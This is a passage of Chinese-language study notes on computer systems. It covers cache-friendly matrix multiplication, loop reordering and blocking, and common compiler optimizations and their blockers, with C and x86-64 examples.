机器吞吐量的三维坐标图（存储器山）</strong>，以此展示缓存对程序性能的重要影响。</p><p>其中，我们以访问数组的程序为例。我们将遍历数组的步长作为衡量程序空间局部性的指标（步长越大，空间局部性越小），将一次读取数组元素数量作为衡量程序时间局部性的指标（一次取出的数据越多，访问到相同地址数据的机会越小，时间局部性越小）；</p><p>如图：</p><p><img src="imgs/memory_mountain.png" height="350px"></p><p>我们<strong>从读取数据量 size 的方向</strong>看图，会发现 memory mountain 有一个个像山脊一样的结构，这恰好对应了从 L1 到 Memories 的数据引用的平均性能（小的数据量更有可能在每次遍历时放在同一个缓存的 block 中，发生 cache miss 的机会就更小，只需要依靠更接近寄存器层级的缓存设备就能得到答案）；</p><p><img src="imgs/space-loc-stat.png" height="350px"></p><p>而<strong>从数组访问步长 stride 的方向</strong>看图，会发现随着步长的增加，整体有一个负向的斜率。而随着步长大到一定程度，负向的斜率趋于平缓，这是因为<strong>步长大过了缓存 block size，导致几乎每次都会存在 Cache miss，就很难得到缓存的增益了</strong>。</p><p><img src="imgs/temporal-loc-stat.png" height="350px"></p><h3 id="11-5-3-Writing-Cache-Friendly-Code-Ⅱ-Rearranging-loops-to-improve-spacial-locality"><a href="#11-5-3-Writing-Cache-Friendly-Code-Ⅱ-Rearranging-loops-to-improve-spacial-locality" class="headerlink" title="11.5.3 Writing Cache Friendly Code Ⅱ - Rearranging loops to improve spacial locality"></a>11.5.3 Writing Cache Friendly Code Ⅱ - Rearranging loops to improve spacial locality</h3><p>借助上面对于 memory mountain 的进一步分析，我们还可以想到更多的具体<strong>利用缓存来优化程序性能的方法</strong>。</p><p>例如，我们<strong>以矩阵乘法运算为例</strong>，我们假定以下的条件：</p><ul><li>N × N 方阵，元素为 double（8 bytes）类型；</li></ul><p>那么按照正确的一般矩阵相乘的方法，总单位运算次数 $O(N^3)$；</p><p>事实上，计算的一般方法有许多种（但都是 结果矩阵 $C=(c_{ij})_{N\times N}$ 的元素 $c_{ij}=a_{ik}\cdot b_{kj}$），我们<strong>这里着重讨论缓存的效率受代码安排的影响，也即，什么样的矩阵乘法最能充分利用缓存</strong>。</p><p>首先来对不同策略的矩阵乘法分析 Miss Rate：</p><ul><li>前提假设<ul><li>机器缓存空间的 <strong>块大小（<code>B</code>）为 32 Bytes（能够一次性放下 4 个 double 数据）</strong>；</li><li>矩阵维度 <code>N</code> 非常大（$\dfrac{1}{N}\approx0$）;</li><li>缓存空间的总大小不足以装下矩阵的多个行；</li></ul></li><li>分析方法：<strong>检查内层循环的函数访问模式</strong>（因为外层循环次数不可避免）；</li></ul><p>由于运算的方式固定，我们可以通过更换内外层循环顺序（共 $3!=6$ 种）来看究竟哪种方法最好。</p><p>在分析前，先再次回顾一下 C 中数组的 memory layout：</p><ul><li>二维数组的<strong>至少每一行的数据空间是 contiguous 的</strong>，并且<strong>行优先（row major）</strong>；</li><li>stride-1 逐个访问数组行的方法最能利用 spacial locality，它的 $miss\space rate=\dfrac{sizeof(a_{ij})}{B}$，其中 $B$ 是缓存空间的块大小；</li><li>stride-1 逐个访问较大数组列的方法完全无法利用 spacial locality，因为 每一列同一行的元素一定不在同一个缓存数据块中（之前已经假设 “缓存空间的总大小不足以装下矩阵的多个行”），因此 miss rate = 1（100% cache miss）；</li></ul><p><strong>情况 1：先固定 i（A 的行），再固定 j（B 的列），最后遍历 k（A 第 i 行每一列、B 第 j 列每一行）</strong></p><p><img src="imgs/cache_analysis_matrix_multiply_ijk.png" height="200px"></p><p>这种情况下，<strong>对每一个最内层循环</strong>：</p><ul><li>每次要求从内存中取出 A 矩阵的同行相邻元素，<strong>miss rate = 8 / 32 = 0.25</strong>；</li><li>每次要求从内存中取出 B 矩阵的同列相邻元素，<strong>miss rate = 1</strong>；</li><li>每次要求从内存中取出 C 矩阵的一个元素，所以对单个元素而言 <strong>miss rate 近似为 0</strong>；</li></ul><p>ℹ 平均每次内层循环<strong>约加载 2 次数据，存储 0 次，cache miss 次数 1.25 次</strong>；</p><p>这种情况与 <strong><code>jik</code></strong> 顺序的情况相同；</p><p> <strong>情况 2：先固定 k（B 的行），再固定 i（A 固定位置 第 i 行 第 k 列），最后遍历 j（C 的第 i 行每一列）</strong></p><p><img src="imgs/cache_analysis_matrix_multiply_kij.png" height="175px"></p><p>这种情况下，<strong>对每一个最内层循环</strong>：</p><table>    <tr>        <th>Op Matrix</th>        <td>A</td>        <td>B</td>        <td>C</td>    </tr>    <tr>        <th>Miss Rate</th>        <td>0.0</td>        <td>0.25</td>        <td>0.25</td>    </tr></table><p>ℹ 平均每次内层循环<strong>约加载 2 次数据，存储 1 次，cache miss 次数 0.5 次</strong>；</p><p>这种情况与 <strong><code>ikj</code></strong> 顺序的情况相同；</p><p><strong>情况 3：先固定 j（C 的第 j 列每一行），再固定 k（A 的第 k 列），最后遍历 i（固定 B 遍历 C 的 列）</strong></p><p><img src="imgs/cache_analysis_matrix_multiply_jki.png" height="175px"></p><p>这种情况下，<strong>对每一个最内层循环</strong>：</p><table>    <tr>        <th>Op Matrix</th>        <td>A</td>        <td>B</td>        <td>C</td>    </tr>    <tr>        <th>Miss Rate</th>        <td>1.0</td>        <td>0.0</td>        <td>1.0</td>    </tr></table><p>ℹ 平均每次内层循环<strong>约加载 2 次数据，存储 1 次，cache miss 次数 2.0 次</strong>；</p><p>这种情况与 <strong><code>kji</code></strong> 顺序的情况相同；</p><hr><p>综合上面的三种情况，我们进行实际的测试，发现结果如我们所料：</p><p><img src="imgs/core_i7_matrix_multiply_perf.png" height="300px"></p><p>事实证明，<strong><code>kij/ikj</code> 遍历方法（固定 A / B 的位置，遍历剩下一个运算矩阵的行，来得到结果矩阵的行）是最能利用 cache memories 的优势的方法</strong>，而我们最常用的 <code>ijk</code> 方法却不是最好的方法。</p><h3 id="11-5-4-Writing-Cache-Friendly-Code-Ⅲ-Using-blocking-to-improve-temporal-locality"><a href="#11-5-4-Writing-Cache-Friendly-Code-Ⅲ-Using-blocking-to-improve-temporal-locality" class="headerlink" title="11.5.4 Writing Cache Friendly Code Ⅲ - Using blocking to improve temporal locality"></a>11.5.4 Writing Cache Friendly Code Ⅲ - Using blocking to improve temporal locality</h3><p>上一节的例子主要以矩阵乘法为例，从提升<strong>空间局部性</strong>的层面来充分利用缓存、提示程序缓存效率。本节将从另一个角度——提升程序<strong>时间局部性</strong>来讨论如何写出缓存友好的代码。</p><p>再举一个针对矩阵乘法的例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = (<span class="type">double</span> *) <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">double</span>), n*n);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiply n x n matrices a and b */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmm</span><span class="params">(<span class="type">double</span> *a, <span class="type">double</span> *b, <span class="type">double</span> *c, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                c[i*n + j] += a[i*n + k] * b[k*n + j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上面的乘法而言，我们作如下假设：</p><ul><li>机器缓存空间的 <strong>块大小（<code>B</code>）为 64 Bytes（能够一次性放下 8 个 double 数据）</strong>；</li><li>矩阵维度 <code>N</code> 非常大（$\dfrac{1}{N}\approx0$）;</li><li>缓存空间的总大小不足以装下矩阵的多个行；</li></ul><p>在这种情况下，最内层的循环中，每一个循环的 cache miss 平均次数为：$\dfrac{n}{8}+n=\dfrac{9}{8}n$，于是总的 cache miss 的数量在 $\dfrac{9n^3}{8}$ 左右，显然，这样的 cache miss 数量会显著影响程序性能和对缓存的利用。于是，一种利用时间局部性的方法就出现了：</p><p><strong>我们在每次内存循环取矩阵乘法的 $C$ 的单元的时候，将单独取一个改为选取一个 block（小型块），如图所示，block 的宽度为 $B$：</strong></p><p><img src="imgs/multi_simple.png" height="150px"></p><p>改为：</p><p><img src="imgs/multi_block.png" height="150px"></p><p>即计算代码改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = (<span class="type">double</span> *) <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">double</span>), n*n);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiply n x n matrices a and b */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmm</span><span class="params">(<span class="type">double</span> *a, <span class="type">double</span> *b, <span class="type">double</span> *c, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i+=B)</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j+=B)</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k+=B)</span><br><span class="line">                    <span class="comment">/* B x B mini matrix multiplications */</span></span><br><span class="line">                    <span class="keyword">for</span> (i1 = i; i1 &lt; i+B; i1++)</span><br><span class="line">                        <span class="keyword">for</span> (j1 = j; j1 &lt; j+B; j1++)</span><br><span class="line">                            <span class="keyword">for</span> (k1 = k; k1 &lt; k+B; k1++)</span><br><span class="line">                                c[i1*n+j1] += a[i1*n + k1]*b[k1*n + j1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们再次分析 cache miss 的情况。</p><p>假设选取的 $B$ 的大小能够被缓存利用：$3B^2\lt C$，那么：</p><ul><li><p>每一个 sub-block（子块）内部的 cache miss 数量：$\dfrac{B^2}{8}$；</p></li><li><p>每一次行循环的 cache miss 数：$\dfrac{2n}{B}\cdot\dfrac{B^2}{8}=\dfrac{nB}{4}\sim O(nB)$；</p></li><li>总的 cache miss 数：$\dfrac{nB}{4}\cdot(\dfrac{n}{B})^2=\dfrac{n^3}{4B}$；</li></ul><p>总而言之，这样的改进并没有根本上提升算法的时间复杂度，但是它却能确确实实地减少常数级别的 cache miss 数量（$\dfrac{9}{8}n^3\rightarrow\dfrac{1}{4B}n^3$），在一定程度上达到提升时间局部性的效果。这样，只要我们选择满足 $3B^3\lt C$ 的最大的 $B$ 的取值，就能找到这种思路的最优计算方法。</p><p>为什么能够引起如此大的常数优化呢？主要是以下原因：</p><ul><li>我们在选取 block 的时候，相当于加载了一个地址上更相邻的、之后能被反复使用的变量，因为我们缩小了矩阵乘法的 $N$，逐个 block 攻破，这样的矩阵乘法更能利用时间局部性；<ul><li>输入数据 $3n^2$，计算 $2n^3$，而每个元素需要被使用 $O(n)$ 次；</li></ul></li></ul><h3 id="11-5-5-Cache-Performance-Summary"><a href="#11-5-5-Cache-Performance-Summary" class="headerlink" title="11.5.5 Cache Performance Summary"></a>11.5.5 Cache Performance Summary</h3><p>在 11.5 节中，我们通过几个例子了解到，<strong>虽然我们无法显式控制 cache 的存储方式，但是通过对于程序局部性的分析，我们可以更高效地利用 cache，从而提升程序允许效率。</strong>这主要可以从两个方面下手：</p><ul><li>使用 stride-1 reference pattern、关注内层循环的步长和方式，以提升程序的空间局部性；</li><li>多次使用相同的局部变量、分块访问，以提升程序的时间局部性；</li></ul><h1 id="Chapter-12-Program-Optimization"><a href="#Chapter-12-Program-Optimization" class="headerlink" title="Chapter 12. Program Optimization"></a>Chapter 12. Program Optimization</h1><blockquote><p>One of the themes for this chapter: </p><ul><li>去除程序不必要的工作、编写编译器友好代码、提升运行速度；</li><li>利用机器代码特性，针对特定机器对程序优化；</li></ul></blockquote><p>编译器无法理解一些内容，例如 int 数据类型可能只用到相当小的范围、procedure call 究竟是什么意思，等待。编译器只是针对一些特定情况，对照 “cookbook” 进行有选择地优化。其遇到复杂或者特殊情况的 “保底” 方案是不对代码进行优化。</p><p>初始思路：查看程序汇编代码哪些地方没被优化，找到对应的源码部分进行重写，直至重构成编译器友好代码（只要不过度牺牲程序可读性就行）。</p><h2 id="12-1-Goals-of-Optimization"><a href="#12-1-Goals-of-Optimization" class="headerlink" title="12.1 Goals of Optimization"></a>12.1 Goals of Optimization</h2><ul><li>Minimize number of instructions<ul><li>避免重复计算；</li><li>避免不必要的计算；</li><li>避免较大计算量的操作（例如乘、除）；</li></ul></li><li>Avoid waiting for memory<ul><li>尽量将数据和运算过程放在 register 中，而非内存中；</li><li>使用 cache-friendly 的方式访问内存；</li><li>尽早从内存加载数据，并且加载次数越少越好；</li></ul></li><li>Avoid branching<ul><li>不要写出不必要的判断结构；</li><li>写成让 CPU 容易预测分支的代码（流水线）；</li><li>尽量解开循环，分摊分支的开销；</li></ul></li><li>Make good use of locality &amp; cache: 写出程序局部性良好的代码、充分利用缓存机制（10.2 &amp; 11.X）；</li></ul><h2 id="12-2-Limits-to-Compiler-Optimization"><a href="#12-2-Limits-to-Compiler-Optimization" class="headerlink" title="12.2 Limits to Compiler Optimization"></a>12.2 Limits to Compiler Optimization</h2><ul><li><p>无法优化算法的渐进时间复杂度；</p></li><li><p>绝不会改变程序语义、行为；</p></li><li><p>编译时仅仅分析每个函数一次（inline 函数除外）；</p><blockquote><p>目前 Whole-program analysis (“LTO”) 比较受欢迎，尽管开销很大；</p></blockquote></li><li><p>无法很好地针对运行时的输入内容进行优化</p><ul><li>可能出现最坏情况，尤其是面对非法输入的时候；</li></ul></li></ul><h2 id="12-3-Generally-Useful-Optimizations"><a href="#12-3-Generally-Useful-Optimizations" class="headerlink" title="12.3 Generally Useful Optimizations"></a>12.3 Generally Useful Optimizations</h2><blockquote><p>本部分的优化技巧不针对特定的编译器或者处理器，具有普适性。</p><p>绝大多数编译器在一定的优化等级下，都能优化本节的情况，但是我们应该学习这些方法。</p><p>注：一个能看到优化过程的网站：<a href="https://godbolt.org/z/Es5s8qsvj">COMPILER EXPLORER</a></p></blockquote><p>根据 12.1 中的目标，我们可以整理出一些常见的情况，这些情况下编译器能够优化，或者说具有普适性的优化策略，主要有以下两类：</p><ul><li>Local Optimizations (<strong>work inside a single basic block</strong>)<ul><li>Constant folding（常数折叠）</li><li>Strength reduction（计算强度削减）</li><li>Dead code elimination（死代码剔除）</li><li>Local CSE（Local Common Subexpression Elimination，局部的相似子表达式复用）</li><li>……</li></ul></li><li>Global Optimizations (<strong>process the entire control flow graph of a function</strong>)<ul><li>Loop transformations（循环结构转换）</li><li>Code motion（代码移动）</li><li>Inlining（内联化）</li><li>Global CSE（全局的相似子表达式复用）</li></ul></li></ul><p>这章仅仅叙述它们的思路，不涉及具体实现，因为具体实现就涉及到编译原理（AST 语法树等知识）；</p><h3 id="12-3-1-Constant-Folding"><a href="#12-3-1-Constant-Folding" class="headerlink" title="12.3.1 Constant Folding"></a>12.3.1 Constant Folding</h3><p>常数折叠的方法主要有以下几个方面：</p><ul><li><p>直接运算代码中的常数表达式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> mask = <span class="number">0xFF</span> &lt;&lt; <span class="number">8</span>;</span><br><span class="line"><span class="comment">// 优化为：</span></span><br><span class="line"><span class="type">long</span> mask = <span class="number">0xFF00</span>;</span><br></pre></td></tr></table></figure></li><li><p>直接运算一切可以常量化的表达式，例如针对常量调用的库函数、常量输入等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> namelen = <span class="built_in">strlen</span>(<span class="string">&quot;Harry Bovik&quot;</span>);</span><br><span class="line"><span class="comment">// 优化为：</span></span><br><span class="line"><span class="type">size_t</span> namelen = <span class="number">11</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="12-3-2-Dead-Code-Elimination"><a href="#12-3-2-Dead-Code-Elimination" class="headerlink" title="12.3.2 Dead Code Elimination"></a>12.3.2 Dead Code Elimination</h3><p>死代码删除方法的思路主要来源于 12.1 中的 “Avoid Branching” 和 “Minimize number of instructions”，分为以下几种情况：</p><ul><li><p>删除语义上不可能执行到的代码（无效代码）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">0</span>) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Hello, 0&quot;</span>); &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Hello, 1&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改为：</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Hello, 1&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>删除结果被覆盖的代码（也是无效代码）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">23</span>; x = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改为：</span></span><br><span class="line">x = <span class="number">42</span>;</span><br></pre></td></tr></table></figure></li></ul><p>这类优化方式看起来很蠢，但也很重要，因为有时候这些死代码不容易被肉眼识别，或者在编译器进行其他优化过程中，在语义树上出现了，那么就需要这种方法来清理。</p><h3 id="12-3-3-Common-Subexpression-Elimination"><a href="#12-3-3-Common-Subexpression-Elimination" class="headerlink" title="12.3.3 Common Subexpression Elimination"></a>12.3.3 Common Subexpression Elimination</h3><p>CSE 的思路就是根据 AST 树的特征，约去<strong>重复计算</strong>，从而降低运算量，例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 此处展示的是 Local CSE */</span></span><br><span class="line"></span><br><span class="line">up = val[(i<span class="number">-1</span>)*n + j];</span><br><span class="line">down = val[(i+<span class="number">1</span>)*n + j];</span><br><span class="line">left = val[i*n + j - <span class="number">1</span>];</span><br><span class="line">right = val[i*n + j + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以改为：</span></span><br><span class="line"><span class="type">long</span> inj = i*n + j;</span><br><span class="line">up = val[inj - n];</span><br><span class="line">down = val[inj + n];</span><br><span class="line">left = val[inj - <span class="number">1</span>];</span><br><span class="line">right = val[inj + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">norm[i] = v[i].x * v[i].x + v[i].y * v[i].y;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改为：</span></span><br><span class="line">elt = &amp;v[i];</span><br><span class="line">x = elt-&gt;x;</span><br><span class="line">y = elt-&gt;y;</span><br><span class="line">norm[i] = x * x + y * y;</span><br></pre></td></tr></table></figure><h3 id="12-3-4-Code-Motion"><a href="#12-3-4-Code-Motion" class="headerlink" title="12.3.4 Code Motion"></a>12.3.4 Code Motion</h3><p>I.e., reduce frequency with which computation performed（也是降低代码重复运算频率，不过是在 global 范围进行）</p><ul><li><p>If it will always produce same result（这种改动<strong>语义不变</strong>）；</p></li><li><p>Especially moving code out of loop（常见于将代码移出循环结构，但为了保持语义，要求移动的代码在每次循环中的结果不变）；</p></li><li><p>Example：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_row</span><span class="params">(<span class="type">double</span>* a, <span class="type">double</span>* b, <span class="type">long</span> i, <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> j;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        a[n*i + j] = b[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改为（将 n*i 这个与循环无关的变量提出循环，避免重复运算）：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_row</span><span class="params">(<span class="type">double</span>* a, <span class="type">double</span>* b, <span class="type">long</span> i, <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> j;</span><br><span class="line">    <span class="type">int</span> ni = n * i;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        a[ni + j] = b[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="12-3-5-Inlining"><a href="#12-3-5-Inlining" class="headerlink" title="12.3.5 Inlining"></a>12.3.5 Inlining</h3><p>I.e., copy body of a function into its caller(s);</p><p>对于一些短的、计算开销小的非递归函数，即便编程人员不指定 <code>inline</code> 关键字，编译器也应该识别到并且内联操作。这样做的好处有两点：</p><ul><li>消除函数调用的栈帧分配开销；</li><li>为其他许多优化方法<strong>创造条件</strong>。例如，对代码中的一些函数内联，可以被编译器找到例如 dead code elimination、constant fold 的机会；</li></ul><p>这是个例子：</p><p><img src="imgs/inlining_example1.png"></p><p>缺点：</p><ul><li>这种优化方法在某些情况下（内联函数很长、开销很大）会导致整体代码空间占用变大、速度降低；</li><li>对调试工具、profiling 工具不友好；</li></ul><h3 id="12-3-6-Strength-Reduction"><a href="#12-3-6-Strength-Reduction" class="headerlink" title="12.3.6 Strength Reduction"></a>12.3.6 Strength Reduction</h3><p>I.e., replace costly operation with simpler one.（计算量减小）</p><ul><li>可以用移位、加法尽量代替乘法、除法（优化的比例取决于不同的机器）；</li></ul><h2 id="12-4-Obstacles-for-Compiler-to-Optimization"><a href="#12-4-Obstacles-for-Compiler-to-Optimization" class="headerlink" title="12.4 Obstacles for Compiler to Optimization"></a>12.4 Obstacles for Compiler to Optimization</h2><p>现在反过来看，有哪些操作会阻碍编译器优化？</p><p>阻碍编译器优化的原因之一就是期间调用了其他函数，这样 gcc 可能就无法识别到优化方法。还有一个主要原因就是 “内存别名” 的存在。</p><h3 id="12-4-1-Optimization-Blocker-1-Procedure-Calls"><a href="#12-4-1-Optimization-Blocker-1-Procedure-Calls" class="headerlink" title="12.4.1 Optimization Blocker #1: Procedure Calls"></a>12.4.1 Optimization Blocker #1: Procedure Calls</h3><p>典型例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">lower</span><span class="params">(<span class="type">char</span>* s)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">        <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            s[i] -= (<span class="string">&#x27;A&#x27;</span> - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到，循环判断条件中有一个函数 <code>strlen(s)</code>，我们都知道这是计算字符串长度的函数。但是<strong>编译器不知道</strong>，它认为<strong>这个函数有可能在每次循环中，返回值可能改变</strong>，所以不会把它优化为一个常数，而是保持<strong>每次循环判断时，都重新调用 <code>strlen(s)</code></strong>。</p><p>可是，<code>strlen(s)</code> 的复杂度是  $O(n)$ 啊！这样好端端的 $O(n)$ 能实现的函数被硬生生干成了 $O(n^2)$ ……</p><p>所以，正确的做法是，先把 <code>strlen(s)</code> 算出来。更好的主意是，<strong>干脆不使用 <code>strlen()</code>，因为判断字符串结束原本就是能在循环中发现的情况</strong>，并且把数组索引改成指针取值，这样还能再节省常数时间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">lower</span><span class="params">(<span class="type">char</span>* s)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (*s != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*s &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; *s &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            *s -= (<span class="string">&#x27;A&#x27;</span> - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回过头来，为什么绝大多数的编译器没法优化这种 procedure calls 的情况？主要有几点原因：</p><ul><li>Procedure may have side effects; 就像前面说的，编译器不知道运行这个 procedure 会不会改变当前环境中其他变量的值，所以不敢贸然改变 procedure 运行顺序；</li><li>Procedure 会出现重载、重写的情况，这些函数有不同版本，可能分布在不 同文件中，只有编译结束，链接的时候才知道最终用的函数是谁。对于虚函数而言，甚至要在运行时才知道调用的是哪一个同名函数；所以更不敢随意判断某个 procedure 的作用，也就无法解决上面的问题；</li><li>如果全面分析所有同名 procedure，并且找到它们的含义、作用，那么编译开销过大，非常不现实；</li></ul><p>综上，编译器一般的做法是<strong>将 procedure 看作一个黑盒，行为不确定，所以一般不会优化它的执行顺序</strong>。因此，开发者应该清楚意识到函数的作用，并且重视它执行的位置对代码性能的影响。</p><h3 id="12-4-2-Optimization-Blocker-2-Memory-Aliasing"><a href="#12-4-2-Optimization-Blocker-2-Memory-Aliasing" class="headerlink" title="12.4.2 Optimization Blocker #2: Memory Aliasing"></a>12.4.2 Optimization Blocker #2: Memory Aliasing</h3><p>先看示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sum rows is of n x n matrix a and store in vector b */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sum_rows1</span><span class="params">(<span class="type">double</span>* a, <span class="type">double</span>* b, <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        b[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">               b[i] += a[i*n + j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码看起来性能上没什么问题，大多数人都会如此实现代码。但是我们看看对应的 x86-64 汇编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># sum_rows1 inner loop</span><br><span class="line">.L4:</span><br><span class="line">    movsd(%rsi,%rax,8), %xmm0# FP load</span><br><span class="line">    addsd(%rdi), %xmm0# FP add</span><br><span class="line">    movsd%xmm0, (%rsi, %rax, 8)# FP store</span><br><span class="line">    addq$8, %rdi</span><br><span class="line">    cmpq%rcx, %rdi</span><br><span class="line">    jne.L4</span><br></pre></td></tr></table></figure><p>我们发现，小小的 <code>b[i] += a[i*n + j]</code> 竟然有两次对内存的操作（从内存读到寄存器，计算后再写回内存），为什么会这样？为什么不直接在内存中计算？</p><p>这是因为 <strong>Memory Alias（内存别名）在 C 中是允许的</strong>。比如，如果我这么调用 <code>sum_rows1</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> A[<span class="number">9</span>] =</span><br><span class="line">    &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line">          <span class="number">4</span>,<span class="number">8</span>,<span 